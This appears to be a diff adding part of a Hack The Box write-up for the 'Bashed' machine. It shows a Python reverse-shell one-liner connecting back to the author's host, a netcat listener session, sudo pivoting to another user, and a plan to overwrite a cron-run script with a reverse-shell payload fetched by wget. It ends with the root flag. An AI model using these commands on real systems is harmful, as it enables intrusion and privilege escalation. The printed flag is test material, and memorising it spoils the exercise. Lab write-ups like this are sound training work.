@@ -92,4 +92,94 @@ User www-data may run the following commands on bashed:
 ```
 
 7. Interesting, we can run any command as scriptmanager.
-8. 
+8. Well to use the sudoers permission, we need to do reverse shell, i used this reverse shell payload template:
+
+```py
+python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.25",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
+```
+
+9. Set a listener at port 1337 then run the script at the webshell.
+
+> RESULT - We got shell.
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/130ccffa-a05c-4638-b602-ae05aae78ec3)
+
+
+10. Now we can run the sudo permission.
+
+```
+┌──(brandy㉿bread-yolk)-[~]
+└─$ nc -nvlp 1337
+listening on [any] 1337 ...
+connect to [10.10.14.25] from (UNKNOWN) [10.10.10.68] 38330
+$ whoami
+whoami
+www-data
+$ sudo -l
+sudo -l
+Matching Defaults entries for www-data on bashed:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on bashed:
+    (scriptmanager : scriptmanager) NOPASSWD: ALL
+$ sudo -u scriptmanager bash -i
+sudo -u scriptmanager bash -i
+scriptmanager@bashed:/var/www/html/dev$ whoami    
+whoami
+scriptmanager
+scriptmanager@bashed:/var/www/html/dev$
+```
+
+> Found 2 interesting files.
+
+```
+scriptmanager@bashed:/$ ls
+ls
+bin   etc         lib         media  proc  sbin     sys  var
+boot  home        lib64       mnt    root  scripts  tmp  vmlinuz
+dev   initrd.img  lost+found  opt    run   srv      usr
+scriptmanager@bashed:/$ cd scripts
+cd scripts
+scriptmanager@bashed:/scripts$ ls
+ls
+test.py  test.txt
+scriptmanager@bashed:/scripts$ 
+```
+
+11. At glance there's no vulnerability at all, but what's interesting here is the .txt file's timestamp keeps updating everytime.
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/8ee6646e-0ef2-478f-82d7-fe0d81737f21)
+
+
+12. Knowing this, my assumption is the test.py is executed every minute (there is a cron job or any background process that runs the python script automatically.
+
+### FLOW
+
+```
+1. Creating a fake test.py which has our reverse shell payload.
+2. Run python http.server.
+3. Then run wget on our reverse shell to grab the fake test.py from our local machine.
+```
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/f5c83800-5da1-44ca-8d2c-e2675c392093)
+
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/b8fa0fd0-dff6-4d73-a607-88f8d585f743)
+
+
+> RESULT
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/180b8ea3-07e7-437f-b6c9-3c2ace516176)
+
+
+> GETTING ROOT FLAG
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/6b35da8d-633e-4349-9dc8-506fd9b93d30)
+
+
+## ROOT FLAG
+
+```
+b1f52542e66c5b9aa0c7f33be686b63a
+```
